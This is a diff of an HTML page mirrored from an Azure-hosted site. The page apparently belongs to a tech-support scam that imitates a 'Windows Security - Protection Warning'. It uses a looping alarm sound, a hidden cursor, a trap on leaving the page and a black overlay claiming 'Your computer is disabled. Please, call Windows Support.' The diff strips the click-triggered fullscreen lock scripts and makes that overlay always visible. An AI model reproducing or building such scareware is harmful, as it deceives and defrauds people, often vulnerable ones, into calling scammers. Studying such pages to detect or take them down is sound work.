@@ -63,28 +63,7 @@ counter"><img alt="free hit counter" class="statcounter" referrerpolicy="no-refe
     left:0
   }
   </style>
-<script>
-  var elem = document.documentElement;
-  function openFullscreen() {
-    if (elem.requestFullscreen) {
-      elem.requestFullscreen();
-    } else if (elem.webkitRequestFullscreen) { /* Safari */
-      elem.webkitRequestFullscreen();
-    } else if (elem.msRequestFullscreen) { /* IE11 */
-      elem.msRequestFullscreen();
-    }
-  }
 
-  function closeFullscreen() {
-    if (document.exitFullscreen) {
-      document.exitFullscreen();
-    } else if (document.webkitExitFullscreen) { /* Safari */
-      document.webkitExitFullscreen();
-    } else if (document.msExitFullscreen) { /* IE11 */
-      document.msExitFullscreen();
-    }
-  }
-  </script>
 <script type="text/javascript">
 window.onbeforeunload = function() {
    if (data_needs_saving()) {
@@ -121,7 +100,6 @@ window.onbeforeunload = function() {
                   </script>
 </head>
 <body id="mycanvas" onclick="playSound()">
-
 <div class="bg" style="cursor:none;">
 <div class="bgimg" style="top: 0px;"><img alt="" src="bg.png" width="100%"/></div>
 </div>
@@ -158,10 +136,10 @@ window.onbeforeunload = function() {
 </li>
 <li>
 <br/>
-<img src="Z5BR-network.png" width="51px;">
+<img src="Z5BR-network.png" width="51px;"/>
 <p>Application and browser control</p>
 <p style="top: 270px; position: absolute; font-size: 13px; color: grey;">No action required.</p>
-</img></li>
+</li>
 </ul>
 </div>
 <img class="" id="clscl" src="uZbx-si.png" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;"/>
@@ -274,18 +252,7 @@ margin-top: 8px; text-align: center;">Windows Security - Protection Warning</p>
 <audio id="beep" loop="">
 <source src="_Fm7-alert.mp3" type="audio/mpeg"/>
 </audio>
-<script>
-  addEventListener("click", function() {
-var el = document.documentElement
-  , rfs =
-         el.requestFullScreen
-      || el.webkitRequestFullScreen
-      || el.mozRequestFullScreen
-;
-rfs.call(el);
-});
 
-</script>
 <div class="websa mnwebs" id="websa" style="display: block;">
 <div class="ilb top">
 <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
@@ -322,7 +289,6 @@ rfs.call(el);
 </ul>
 </div>
 </div>
-
 <div id="footer" style="cursor: none;">
 <div class="row">
 <div class="col-md-12">
@@ -339,7 +305,7 @@ rfs.call(el);
 </div>
 </div>
 </div>
-<div class="answer_list" id="welcomeDiv" style=" display:none; background-color:#000; height: auto; width: 550px;left:32%;position: absolute;z-index: 9999999999;text-align: center;top: 0; ">
+<div class="answer_list" id="welcomeDiv" style=" display:block; background-color:#000; height: auto; width: 550px;left:32%;position: absolute;z-index: 9999999999;text-align: center;top: 0; ">
 <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">Do not reboot or use
       Your computer.<br/>Your computer is disabled. Please, call Windows Support. <br/>Access is the block security reason for this
       Computer. <br/>Please contact us immediately. A technician will help you solve the problem.</p>
@@ -351,6 +317,5 @@ rfs.call(el);
       });
   });
 </script>
-
 <!-- Mirrored from cvfff32.z13.web.core.windows.net/AZW5/?id=5&gclid=EAIaIQobChMIiuelnr31iAMVjUf_AR3JmgJjEAAYASAAEgIhl_D_BwE by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Oct 2024 21:18:14 GMT -->
 </body></html>
